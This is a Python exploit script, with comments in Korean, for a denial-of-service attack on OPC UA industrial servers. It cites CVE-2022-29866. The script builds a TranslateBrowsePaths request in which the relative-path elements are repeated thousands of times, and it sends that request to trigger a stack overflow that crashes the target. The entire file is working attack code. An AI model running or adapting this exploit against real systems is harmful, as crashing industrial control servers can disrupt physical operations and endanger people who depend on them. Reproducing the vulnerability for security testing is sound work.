# Translate Browse Path: Call Stack Overflow Attack
#   이 공격은 TranslateBrowsePath를 반복 호출하여 스택 오버플로우 예외를 발생시키는 방식으로 서버를 공격합니다.
#   CVE-2022-29866에서 설명된 취약점을 악용: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2022-29866.pdf

from protocol import *
from config import *
import time
import struct

def attack(server_details, factor=4000):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # 메시지 헤더 준비
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=554)

    # 브라우즈 경로 배열 설정
    AMOUNT_ELEMENTS_BrowsePathElement = 1
    AMOUNT_ELEMENTS_RelativePathElement = 2 * factor

    array_of_browse_path = b""

    # 브라우즈 경로에 대한 단일 노드 경로 구성
    single_browse_path = b""
    single_browse_path += b"\x01"  # 노드 ID: 4바이트 인코딩된 숫자 (0x01)
    single_browse_path += b"\x00"  # 네임스페이스 0
    single_browse_path += struct.pack("<H", 12637)  # 노드 ID: 숫자 ID

    # 상대 경로 설정
    single_relative_path = b""
    single_relative_path += b"\x00"  # 노드 ID: 2바이트 인코딩된 숫자 (0x00)
    single_relative_path += struct.pack("<b", 47)  # 노드 ID: 식별자 번호
    single_relative_path += b"\x00"  # IsInverse: (0 - false)
    single_relative_path += b"\x01"  # Include sub types: (1 - true)
    
    # 첫 번째 타겟 노드 설정 (예: ApplyChanges)
    single_relative_path_target_name = "ApplyChanges"
    single_relative_path += struct.pack("<H", 0)  # 네임스페이스
    single_relative_path += struct.pack("<I", len(single_relative_path_target_name)) + single_relative_path_target_name.encode()

    # 두 번째 타겟 노드 설정 (예: ServerConfiguration)
    single_relative_path += b"\x00"
    single_relative_path += struct.pack("<b", 47)
    single_relative_path += b"\x01"
    single_relative_path += b"\x01"
    single_relative_path_target_name = "ServerConfiguration"
    single_relative_path += struct.pack("<H", 0)
    single_relative_path += struct.pack("<I", len(single_relative_path_target_name)) + single_relative_path_target_name.encode()

    # 상대 경로 요소를 반복적으로 추가
    single_browse_path += struct.pack("<I", AMOUNT_ELEMENTS_RelativePathElement)
    single_browse_path += single_relative_path * AMOUNT_ELEMENTS_RelativePathElement

    # 브라우즈 경로 배열에 브라우즈 경로 추가
    array_of_browse_path += struct.pack("<I", AMOUNT_ELEMENTS_BrowsePathElement)
    array_of_browse_path += single_browse_path * AMOUNT_ELEMENTS_BrowsePathElement

    # 최종 메시지 준비
    message = message_header + message_body + array_of_browse_path

    # 메시지 전송
    print(f"[-] Sending MSG Request - Translate Browse Path to Node ID x {AMOUNT_ELEMENTS_RelativePathElement} times")
    opcua.send_recv(message, count=1, should_recv=True)

    # 일정 시간 대기 후 연결 종료
    time.sleep(0.2)
    print("[-] Closing connection")
    opcua.close()
